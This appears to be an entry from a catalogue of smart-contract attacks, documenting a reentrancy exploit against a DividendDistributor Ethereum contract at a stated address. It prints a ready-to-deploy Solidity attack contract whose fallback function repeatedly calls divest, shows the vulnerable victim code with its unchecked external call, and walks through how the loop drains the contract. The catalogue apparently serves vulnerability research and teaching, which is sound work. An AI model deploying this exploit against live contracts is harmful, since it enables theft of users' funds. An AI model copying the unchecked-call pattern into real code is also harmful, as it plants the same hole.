#########
Attack 02
#########

**Contract Name**

DividendDistributor

**Contract Address**

0x7bc51b19abe2cfb15d58f845dad027feab01bfa0

**Transaction Count**

6

**Invovled Ethers**

1.6 Ethers

**Length of the Call Chain**

2 internal function calls, 1 external function

**Victim Function**

``loggedTransfer``

**Attack Mechanisim**

Attack code:
::

    contract Attack{
        DividendDistributor d = new DividendDistributor();
        uint bigamount = 1;
        constructor() payable {}
        function register() public {
            d.invest.value(10)();
        }
        function attack(uint amount) public {
            d.divest(amount);
        }
        function() payable{
            d.divest(bigamount);
        }
        function getvalue() returns (uint) {
            return this.balance;
        }
    }

Attacked code:
::

    contract DividendDistributor is Ownable{
        struct Investor {
            uint investment;
            uint lastDividend;
        }

        mapping(address => Investor) investors;

        uint public minInvestment;
        uint public sumInvested;
        uint public sumDividend;
        
        function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) protected
        {
            if(! target.call.value(amount)() )
                throw;
            Transfer(amount, message, target, currentOwner);
        }
        
        function invest() public payable {
            if (msg.value >= minInvestment)
            {
                investors[msg.sender].investment += msg.value;
                sumInvested += msg.value;
                // manually call payDividend() before reinvesting, because this resets dividend payments!
                investors[msg.sender].lastDividend = sumDividend;
            }
        }

        function divest(uint amount) public {
            if ( investors[msg.sender].investment == 0 || amount == 0)
                throw;
            // no need to test, this will throw if amount > investment
            investors[msg.sender].investment -= amount;
            sumInvested -= amount; 
            this.loggedTransfer(amount, "", msg.sender, owner);
        }
        
        // OWNER FUNCTIONS TO DO BUSINESS
        function distributeDividends() public payable onlyOwner {
            sumDividend += msg.value;
        }
        
        function doTransfer(address target, uint amount) public onlyOwner {
            this.loggedTransfer(amount, "Owner transfer", target, owner);
        }
        
        function setMinInvestment(uint amount) public onlyOwner {
            minInvestment = amount;
        }
        
        function () public payable onlyOwner {
        }
        ...
    }

In this attack, we need to register the ``investors`` array first in order to guarantee we can pass the ``if`` condition in victim function ``divest``. We send ethers to the victim function to add some balances to variable ``sumInvested``. 

The attack process starts with function ``attack`` in the attacker's contract. It transacts with victim contract by calling ``divest`` function. The ``if`` check doesn't work due to our preliminary efforts. The running process goes to statement ``this.loggedTransfer();`` and calls an internal function ``loggedTransfer``. In this function, it does transaction first, however, the transaction target and the amount rely on the function arguments without any check. The transaction operation will call the fallback function in attacker's code. That's why we set an ``divest`` call in there. Hence, a function call loop is built. We successfully achieved *Reentrancy* attack.